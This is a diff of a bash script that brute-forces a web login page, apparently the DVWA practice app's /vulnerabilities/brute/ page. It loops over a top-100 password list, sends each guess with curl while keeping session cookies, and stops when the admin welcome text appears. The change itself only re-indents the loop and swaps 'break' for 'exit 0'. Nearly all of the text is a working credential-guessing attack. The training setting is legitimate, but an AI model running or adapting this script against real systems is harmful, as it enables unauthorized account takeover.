@@ -18,17 +18,18 @@ curl -v -L -c cookies.txt -b cookies.txt \
 
 # read each line of password list file
 filename='../10-million-password-list-top-100.txt'
-while read line; do
-echo "using user: $USER and password: $line"
-# enter username and password in brute force page: /vulnerabilities/brute/
-RES=`curl -L -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/?username=${USER}&password=${line}&Login=Login#"`
 
-if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
-  printf "\n 🎉 password found: $line\n"
-  break
-else
-  printf "\n 🥲 trying password: $line but failed.\n"
-fi
+while read line; do
+  echo "using user: $USER and password: $line"
+  # enter username and password in brute force page: /vulnerabilities/brute/
+  RES=`curl -L -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/?username=${USER}&password=${line}&Login=Login#"`
+
+  if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
+    printf "\n 🎉 password found: $line\n"
+    exit 0
+  else
+    printf "\n 🥲 trying password: $line but failed.\n"
+  fi
 
 done < $filename
 
